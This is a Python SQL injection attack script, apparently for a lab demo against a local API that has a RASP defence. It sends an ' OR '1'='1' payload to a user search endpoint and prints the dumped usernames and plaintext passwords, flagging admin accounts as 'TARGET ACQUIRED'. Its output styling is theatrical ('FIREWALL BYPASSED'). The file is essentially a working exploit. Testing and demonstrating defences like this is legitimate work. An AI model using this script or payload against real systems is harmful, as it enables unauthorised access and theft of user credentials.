import time
import sys
import requests
import os

# --- CONFIGURATION ---
TARGET_API_URL = "http://127.0.0.1:5000/api/v1/user/search"

def loading_animation():
    os.system('cls' if os.name == 'nt' else 'clear') 
    print("\033[92m") 
    print("[*] Initializing Smart Breach Protocol v3.0...")
    print("[+] Connecting to Target System (Port 5000)...") 
    time.sleep(1)

def run_attack():
    try:
        # SQL Injection Payload
        payload = {"query": "' OR '1'='1"}
        print(f"[+] Sending Payload: {payload}")
        
        response = requests.post(TARGET_API_URL, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            print("\n" + "="*50)
            
            # --- INTELLIGENT DATA DETECTION ---
            # This checks if we got real users or if the server sent us logs by mistake
            if len(data) > 0 and (
                (isinstance(data[0], dict) and 'log_message' in data[0]) or 
                (isinstance(data[0], list) and "CRITICAL" in str(data[0]))
            ):
                print("\033[1m\033[93m [!] WARNING: API RETURNED SECURITY LOGS (NOT USERS) \033[0m")
                print("\033[93m [?] Check your app.py SQL query. You are querying the 'security_logs' table.\033[0m")
                print("="*50)
                # Print the logs anyway so you can see what is happening
                print(f"{'ID':<5} | {'LOG LEVEL':<30} | {'MESSAGE'}")
                print("-" * 80)
                for row in data:
                    # Handle Dict vs List format
                    if isinstance(row, dict):
                        r_id = row.get('id', 'N/A')
                        r_col1 = row.get('severity', 'Unknown') # Likely mapped to Username column in DB
                        r_col2 = row.get('log_message', 'Unknown') # Likely mapped to Password column in DB
                    else:
                        r_id = row[0]
                        r_col1 = row[1]
                        r_col2 = row[2]
                    
                    print(f"{r_id:<5} | {str(r_col1):<30} | {str(r_col2)}")
                    time.sleep(0.1)
                
            else:
                # --- SUCCESS: REAL USER DATA ---
                print("\033[1m\033[91m [SUCCESS] FIREWALL BYPASSED! \033[0m") 
                print("="*50)
                print(f"{'ID':<5} | {'USERNAME':<15} | {'PASSWORD'}")
                print("-" * 45)
                
                target_found = False
                
                for user in data:
                    # Normalize Data (Handle Dict vs List)
                    if isinstance(user, dict):
                        uid = user.get('id')
                        name = user.get('username')
                        pwd = user.get('password')
                    else:
                        uid, name, pwd = user[0], user[1], user[2]
                    
                    # Highlight Targets
                    if name in ["prateek", "sys_admin", "admin"]:
                        print(f"\033[1m\033[92m{uid:<5} | {name:<15} | {pwd}   <-- [TARGET ACQUIRED]\033[0m")
                        target_found = True
                    else:
                        print(f"{uid:<5} | {name:<15} | {pwd}")
                    
                    time.sleep(0.3)
                
                print("-" * 45)
                if target_found:
                    print("\n\033[92m[+] TARGET LOGIN CREDENTIAL FOUND.\033[0m")
                else:
                    print("\n[+] Data Dump Complete.")

        elif response.status_code == 418:
            print("\n[!] BLOCKED BY RASP (Teapot Error)")

        else:
            print(f"\n[!] ATTACK FAILED. Status Code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"\n[!] Connection Failed: {e}")
    except Exception as e:
        print(f"\n[!] Error: {e}")

if __name__ == "__main__":
    try:
        loading_animation()
        run_attack()
    except KeyboardInterrupt:
        # CLEAN EXIT ON CTRL+C
        print("\n\n" + "="*50)
        print(" [!] ABORT: USER TERMINATED CONNECTION")
        print("="*50)
        sys.exit(0)